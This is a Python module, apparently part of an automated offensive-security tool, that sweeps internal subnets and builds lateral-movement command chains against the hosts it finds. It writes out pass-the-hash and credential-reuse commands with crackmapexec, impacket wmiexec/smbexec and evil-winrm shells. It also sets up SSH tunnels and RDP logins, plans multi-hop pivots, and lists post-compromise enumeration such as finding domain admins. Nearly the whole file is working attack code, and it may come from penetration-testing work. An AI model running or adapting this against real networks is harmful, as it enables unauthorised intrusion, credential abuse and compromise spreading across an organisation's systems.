"""lateral_movement.py — Lateral Movement Engine.

Automatically discovers internal targets, selects the best movement
technique based on available credentials/sessions, and generates the
complete command chain. Everything runs inside the kali-as container.

Techniques supported:
  - Pass-the-Hash (T1550.002) — via crackmapexec / impacket
  - SSH Tunneling (T1572)      — via ssh -L / ssh -D
  - Credential Reuse (T1078)   — via crackmapexec / evil-winrm
  - WMI Execution (T1047)      — via wmiexec.py
  - SMB Execution (T1021.002)  — via smbexec.py
  - Scheduled Task (T1053.005) — via atexec.py
"""
from __future__ import annotations

import logging
import re
import subprocess
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("AttackSurface.LateralMovement")

KALI_CONTAINER = "kali-as"


def _docker(args: List[str], timeout: int = 30, input_data: str = "") -> str:
    """Run a command inside the kali-as container."""
    try:
        r = subprocess.run(
            ["docker", "exec", "-i", KALI_CONTAINER] + args,
            capture_output=True, text=True, timeout=timeout, input=input_data,
        )
        return (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return f"[ERROR] {e}"


# ── Internal target discovery ────────────────────────────────────
def discover_internal_targets(subnet: str, source_host: str = "") -> List[Dict[str, Any]]:
    """Ping-sweep an internal subnet inside kali-as.

    Returns list of alive hosts with basic service detection.
    """
    # Validate CIDR
    if "/" not in subnet:
        return []

    # Ping sweep (fast: parallel, 1 timeout)
    ping_cmd = [
        "bash", "-c",
        f"nmap -sn -T4 --min-rate 1000 {subnet} 2>/dev/null | "
        f"grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | sort -t. -k4 -n"
    ]
    out = _docker(ping_cmd, timeout=45)
    ips = [ip for ip in out.strip().splitlines() if re.match(r"\d+\.\d+\.\d+\.\d+", ip)]

    # Filter out source and network/broadcast
    targets = []
    for ip in ips:
        if ip == source_host:
            continue
        last_octet = int(ip.split(".")[-1])
        if last_octet == 0 or last_octet == 255:
            continue
        targets.append(ip)

    if not targets:
        return []

    # Quick service detection on discovered hosts (top ports only)
    svc_cmd = [
        "bash", "-c",
        f"echo '{' '.join(targets[:20])}' | xargs -I{{}} -P8 "
        f"nmap -T4 --top-ports 20 -sV --version-light {{}} 2>/dev/null | "
        f"grep -B1 'open' | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+|"
        f"\\d+/tcp\\s+open\\s+\\S+'"
    ]
    svc_out = _docker(svc_cmd, timeout=60)

    # Parse services per IP
    services: Dict[str, List[Dict[str, Any]]] = {}
    current_ip = ""
    for line in svc_out.strip().splitlines():
        ip_m = re.match(r"(\d+\.\d+\.\d+\.\d+)", line.strip())
        svc_m = re.match(r"(\d+)/tcp\s+open\s+(\S+)", line.strip())
        if ip_m:
            current_ip = ip_m.group(1)
            services.setdefault(current_ip, [])
        elif svc_m and current_ip:
            services[current_ip].append({
                "port": int(svc_m.group(1)),
                "service": svc_m.group(2),
            })

    results = []
    for ip in targets:
        results.append({
            "ip": ip,
            "services": services.get(ip, []),
            "alive": ip in services or True,
        })
    return results


# ── Technique selection ──────────────────────────────────────────
def select_techniques(
    source: Dict[str, Any],
    target: Dict[str, Any],
    creds: Optional[Dict[str, Any]] = None,
) -> List[Dict[str, Any]]:
    """Select the best lateral movement techniques for source→target.

    Returns list of technique dicts, ordered by likelihood of success.
    """
    creds = creds or {}
    src_ip = source.get("ip", source.get("host", ""))
    tgt_ip = target.get("ip", target.get("host", ""))
    tgt_svcs = {s["port"]: s["service"].lower() for s in target.get("services", [])}

    has_smb = any(p in tgt_svcs or "smb" in tgt_svcs[p] for p in [445, 139])
    has_ssh = any(p in tgt_svcs or "ssh" in tgt_svcs[p] for p in [22])
    has_rdp = any(p in tgt_svcs or "rdp" in tgt_svcs[p] for p in [3389])
    has_winrm = any("winrm" in tgt_svcs.get(p, "") for p in [5985, 5986])
    has_wmi = has_smb  # WMI runs over SMB

    username = creds.get("username", "")
    password = creds.get("password", "")
    hash_val = creds.get("hash", creds.get("ntlm", ""))
    domain = creds.get("domain", "")
    has_hash = bool(hash_val)
    has_pass = bool(username and password)

    techniques = []

    # Pass-the-Hash via crackmapexec
    if has_hash and has_smb:
        techniques.append({
            "technique": "Pass-the-Hash",
            "mitre_id": "T1550.002",
            "confidence": 90 if has_hash else 0,
            "command": (
                f"crackmapexec smb {tgt_ip} -u {username} -H {hash_val} "
                f"-d {domain} --local-auth -x 'whoami' 2>/dev/null"
            ),
            "description": f"PtH to {tgt_ip} via SMB using NTLM hash",
        })

    # Credential reuse via crackmapexec
    if has_pass and (has_smb or has_ssh or has_winrm):
        svc_flag = "smb" if has_smb else ("ssh" if has_ssh else "winrm")
        techniques.append({
            "technique": "Credential Reuse",
            "mitre_id": "T1078",
            "confidence": 85,
            "command": (
                f"crackmapexec {svc_flag} {tgt_ip} "
                f"-u {username} -p {password} -d {domain} -x 'whoami' 2>/dev/null"
            ),
            "description": f"Reuse credentials on {tgt_ip} via {svc_flag}",
        })

    # WMI execution
    if has_wmi and (has_pass or has_hash):
        auth = f"-hashes :{hash_val}" if has_hash else f"-u {username} -p {password}"
        techniques.append({
            "technique": "WMI Execution",
            "mitre_id": "T1047",
            "confidence": 80,
            "command": (
                f"wmiexec.py {auth}{' ' + domain + '/' if domain else ''} "
                f"{tgt_ip} 'whoami' 2>/dev/null"
            ),
            "description": f"Execute via WMI on {tgt_ip}",
        })

    # SMB execution (smbexec)
    if has_smb and (has_pass or has_hash):
        auth = f"-hashes :{hash_val}" if has_hash else f"-u {username} -p {password}"
        techniques.append({
            "technique": "SMB Execution",
            "mitre_id": "T1021.002",
            "confidence": 75,
            "command": (
                f"smbexec.py {auth}{' ' + domain + '/' if domain else ''} "
                f"{tgt_ip} 2>/dev/null"
            ),
            "description": f"Execute via SMB on {tgt_ip}",
        })

    # SSH tunnel / pivot
    if has_ssh:
        techniques.append({
            "technique": "SSH Tunnel",
            "mitre_id": "T1572",
            "confidence": 70,
            "command": (
                f"ssh -f -N -L 13389:{tgt_ip}:3389 "
                f"{username}@{tgt_ip} 2>/dev/null && echo 'Tunnel established'"
            ),
            "description": f"SSH tunnel through {tgt_ip} for RDP pivot",
        })

    # Evil-WinRM
    if has_winrm and (has_pass or has_hash):
        auth = f"-p {password}" if has_pass else f"-H {hash_val}"
        techniques.append({
            "technique": "WinRM Shell",
            "mitre_id": "T1021.006",
            "confidence": 82,
            "command": f"evil-winrm -i {tgt_ip} -u {username} {auth} 2>/dev/null",
            "description": f"WinRM shell on {tgt_ip}",
        })

    # RDP cred check
    if has_rdp and has_pass:
        techniques.append({
            "technique": "RDP Auth Check",
            "mitre_id": "T1021.001",
            "confidence": 60,
            "command": (
                f"xfreerdp /u:{username} /p:{password} /v:{tgt_ip} "
                f"/cert:ignore +auto-reconnect 2>/dev/null & echo 'RDP attempt sent'"
            ),
            "description": f"RDP auth attempt to {tgt_ip}",
        })

    # Sort by confidence
    techniques.sort(key=lambda t: t["confidence"], reverse=True)
    return techniques


# ── Full lateral movement plan ───────────────────────────────────
def build_lateral_plan(
    scan_data: Dict[str, Any],
    creds: Optional[Dict[str, Any]] = None,
    source_host: str = "",
    internal_subnets: Optional[List[str]] = None,
) -> Dict[str, Any]:
    """Build a complete lateral movement plan from scan data.

    Steps:
      1. Discover internal targets (ping sweep)
      2. Select techniques per target
      3. Generate ordered command chain
      4. Return plan with evidence collection steps
    """
    creds = creds or {}

    # Find internal subnets from scan data
    if internal_subnets is None:
        internal_subnets = []
        for h in (scan_data.get("hosts") or []):
            ip = h.get("ip", "")
            if ip and not ip.startswith(("127.", "10.", "172.", "192.168.")):
                continue
            # Derive /24 subnet
            if "." in ip:
                parts = ip.split(".")
                if len(parts) == 4:
                    internal_subnets.append(f"{parts[0]}.{parts[1]}.{parts[2]}.0/24")
        internal_subnets = list(set(internal_subnets))[:5]  # max 5 subnets

    # Discover targets
    discovered: List[Dict[str, Any]] = []
    for subnet in internal_subnets:
        targets = discover_internal_targets(subnet, source_host=source_host)
        discovered.extend(targets)

    # Build movements
    movements = []
    for tgt in discovered:
        source_info = {"ip": source_host or "session_host"}
        techniques = select_techniques(source_info, tgt, creds=creds)
        if techniques:
            best = techniques[0]
            movements.append({
                "target": tgt["ip"],
                "services": tgt.get("services", []),
                "best_technique": best,
                "all_techniques": techniques[:3],  # top 3
                "evidence_cmd": best["command"],
            })

    # Sort by service richness (more services = higher value target)
    movements.sort(key=lambda m: len(m.get("services", [])), reverse=True)

    # Build ordered command chain
    command_chain = []
    for i, mv in enumerate(movements, 1):
        command_chain.append({
            "step": i,
            "target": mv["target"],
            "technique": mv["best_technique"]["technique"],
            "mitre_id": mv["best_technique"]["mitre_id"],
            "command": mv["best_technique"]["command"],
        })

    # Post-movement evidence collection
    evidence_steps = [
        {"cmd": "systeminfo", "desc": "System info on compromised host"},
        {"cmd": "whoami /all", "desc": "Current user context"},
        {"cmd": "net user", "desc": "Enumerate local users"},
        {"cmd": "net group \"Domain Admins\" /domain 2>/dev/null", "desc": "Find domain admins"},
        {"cmd": "arp -a", "desc": "ARP table for network map"},
        {"cmd": "route print", "desc": "Routing table for pivot planning"},
    ]

    return {
        "subnets_scanned": internal_subnets,
        "targets_discovered": len(discovered),
        "movements": movements,
        "command_chain": command_chain,
        "evidence_steps": evidence_steps,
        "summary": (
            f"Discovered {len(discovered)} internal host(s) across "
            f"{len(internal_subnets)} subnet(s). "
            f"{len(movements)} movement path(s) identified."
        ),
    }


# ── Auto-pivot chain ─────────────────────────────────────────────
def auto_pivot_chain(
    scan_data: Dict[str, Any],
    creds: Optional[Dict[str, Any]] = None,
    source_host: str = "",
) -> Dict[str, Any]:
    """Build a multi-hop pivot chain: initial access → lateral → deepest.

    Returns the full chain with per-hop plans.
    """
    plan = build_lateral_plan(scan_data, creds=creds, source_host=source_host)

    # Group movements into hops
    hops = []
    visited = {source_host}

    # First hop: from source to most-connected target
    for mv in plan["movements"][:3]:
        tgt_ip = mv["target"]
        if tgt_ip in visited:
            continue
        visited.add(tgt_ip)
        hops.append({
            "hop": len(hops) + 1,
            "from": source_host or "initial_access",
            "to": tgt_ip,
            "technique": mv["best_technique"]["technique"],
            "mitre_id": mv["best_technique"]["mitre_id"],
            "command": mv["best_technique"]["command"],
        })

        # Second hop: from this target to others
        for mv2 in plan["movements"]:
            tgt2 = mv2["target"]
            if tgt2 in visited:
                continue
            visited.add(tgt2)
            hops.append({
                "hop": len(hops) + 1,
                "from": tgt_ip,
                "to": tgt2,
                "technique": mv2["best_technique"]["technique"],
                "mitre_id": mv2["best_technique"]["mitre_id"],
                "command": mv2["best_technique"]["command"],
            })
            break  # one second hop per first hop

    return {
        "chain": hops,
        "total_hops": len(hops),
        "deepest_target": hops[-1]["to"] if hops else None,
        "plan": plan,
        "summary": (
            f"Pivot chain: {len(hops)} hop(s), "
            f"deepest = {hops[-1]['to'] if hops else 'N/A'}"
        ),
    }
